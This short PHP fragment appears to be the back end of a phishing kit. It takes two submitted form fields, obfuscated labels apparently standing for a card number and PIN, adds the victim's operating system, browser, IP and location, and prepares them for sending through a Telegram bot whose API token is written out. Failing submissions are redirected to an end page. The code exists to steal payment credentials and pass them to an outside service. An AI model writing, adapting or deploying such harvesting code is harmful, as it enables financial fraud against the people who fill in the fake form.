...
////////////////////
if ( isset ($_POST['cod']) && isset ($_POST['cod2']) ){


$message = "Trjtdeb: ".$_POST['cod']." - Pincajer: ".$_POST['cod2']." \r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "5825913279:AAEMQ93kUNj34-sLZsoNiJXZ6XQEPFnp4eU";
...
}else{ header ('location: end.php'); exit();
 }
